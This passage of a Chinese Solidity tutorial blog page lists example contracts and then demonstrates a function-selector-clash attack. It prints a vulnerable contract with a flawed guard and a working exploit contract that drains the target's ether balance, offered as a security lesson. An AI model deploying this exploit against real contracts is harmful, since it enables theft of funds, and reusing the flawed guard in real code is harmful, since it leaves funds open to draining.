+<li>签名验证： 这个例子有助于理解区块链上最基本的验证过程。我们都知道，区款链采取双重哈希配合椭圆曲线函数的加密方式，如何采用<code>keccak256</code>和<code>ecrecover</code>恢复一个<code>address</code>的过程：<a target="_blank" rel="noopener" href="https://solidity-by-example.org/signature">源码</a></li>
+<li>Time Lock：DAO里常用的一种<a target="_blank" rel="noopener" href="https://solidity-by-example.org/app/time-lock">手段</a>，防止被<code>rug pull</code>，基本原理就是设计一个时间窗口期去执行预先设定好的事务</li>
+<li>ERC20：<a target="_blank" rel="noopener" href="https://solidity-by-example.org/app/erc20">ERC20标准</a>的实现，允许转账token和其它人获得转账请求的例子</li>
+<li>ERC721：<a target="_blank" rel="noopener" href="https://solidity-by-example.org/app/erc721">ERC721标准</a>的实现，你可以创建自己的<code>NFT</code></li>
+<li>CREATE2：让我们在未发布合约时提前预测合约地址，<a target="_blank" rel="noopener" href="https://solidity-by-example.org/app/create2">源码</a></li>
+<li>Dutch Auction：<a target="_blank" rel="noopener" href="https://solidity-by-example.org/app/dutch-auction">荷兰拍</a>的实现，重点要清楚价格以一个跟利率X成反比的时间衰减速率的类log曲线下降</li>
+</ol>
+<h3 id="安全与可信"><a href="#安全与可信" class="headerlink" title="安全与可信"></a>安全与可信</h3><p><a href="">Solidity by Example</a>上面全部<code>Hacks</code>相关的例子，鉴于合约上链后非常难以修改，所以合约的编写需要格外小心，提早做好安全防范是最重要的。</p>
+<p>这里演示一个简单的攻击代码（来自<code>Smart Contract Engineer</code>），下面的合约中execute函数使用验证函数签名而不是签名的哈希值的方式来做守护：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract FunctionSelectorClash &#123;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>) <span class="title">payable</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">string calldata _func, bytes calldata _data</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            !eq(_func, <span class="string">&quot;transfer(address,uint256)&quot;</span>),</span><br><span class="line">            <span class="string">&quot;call to transfer not allowed&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        bytes4 sig = bytes4(keccak256(bytes(_func))); <span class="comment">// 这个代码生成一个function selector</span></span><br><span class="line"></span><br><span class="line">        (bool ok, ) = address(<span class="built_in">this</span>).call(abi.encodePacked(sig, _data));</span><br><span class="line">        <span class="built_in">require</span>(ok, <span class="string">&quot;tx failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address payable _to, uint _amount</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == address(<span class="built_in">this</span>), <span class="string">&quot;not authorized&quot;</span>);</span><br><span class="line">        _to.transfer(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eq</span>(<span class="params">string memory a, string memory b</span>) <span class="title">private</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encode(a)) == keccak256(abi.encode(b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里利用哈希碰撞来进行攻击，攻击代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract FunctionSelectorClashExploit &#123;</span><br><span class="line">    address public immutable target;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">address _target</span>)</span> &#123;</span><br><span class="line">        target = _target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Receive ETH from target</span></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="comment">// &quot;transfer(address,uint256)&quot; 与 &quot;func_2093253501(bytes)&quot;</span></span><br><span class="line">        <span class="comment">// 拥有同样的 function selector，也就是函数签名的哈希值</span></span><br><span class="line">        <span class="comment">// 0xa9059cbb</span></span><br><span class="line">        (bool ok, ) = target.call(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                <span class="string">&quot;execute(string,bytes)&quot;</span>,</span><br><span class="line">                <span class="string">&quot;func_2093253501(bytes)&quot;</span>,</span><br><span class="line">                abi.encode(msg.sender, target.balance)</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">require</span>(ok, <span class="string">&quot;pwn failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="高级话题"><a href="#高级话题" class="headerlink" title="高级话题"></a>高级话题</h3><p>to be continue…</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><ol>
+<li>关于<code>DApp</code>开发相关的内容，推荐guoyu的这篇<a target="_blank" rel="noopener" href="https://guoyu.mirror.xyz/RD-xkpoxasAU7x5MIJmiCX4gll3Cs0pAd5iM258S1Ek">文章</a></li>
+<li>强烈推荐将<a target="_blank" rel="noopener" href="https://www.smartcontract.engineer/">Smart Contract Enginner</a>版切</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://izhen.me/2022/05/15/2022_solidity/" data-id="cl32ohoo700003jdxf71ibo6c" data-title="智能合约一日通——Solidity篇" class="article-share-link">Share</a>
+      
+        <a href="https://izhen.me/2022/05/15/2022_solidity/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ERC20/" rel="tag">ERC20</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ERC721/" rel="tag">ERC721</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Smart-Contract/" rel="tag">Smart Contract</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Solidity/" rel="tag">Solidity</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vault/" rel="tag">vault</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-3-0/" rel="tag">web 3.0</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/x070/" rel="tag">x070</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/05/07/2022_web1_web3/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">从web 1.0到web 3.0</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2009-2022 Zhen Yi<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+      <br>
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      <span class="site-uv">用户访问: <span class="busuanzi-value" id="busuanzi_value_site_uv"></span></span>
+      <span class="site-pv">本站访问: <span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a target="_blank" rel="noopener" href="http://sweetpotato.ai" class="mobile-nav-link">λ</a>
+  
+    <a href="/lab" class="mobile-nav-link">About</a>
+  
+    <a target="_blank" rel="noopener" href="https://resume.izhen.me" class="mobile-nav-link">Resume</a>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/i-zhen" class="mobile-nav-link">Github</a>
+  
+</nav>
+    
+<script>
+  var disqus_shortname = 'izhen';
+  
+  var disqus_url = 'https://izhen.me/2022/05/15/2022_solidity/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.async = true;
+    dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
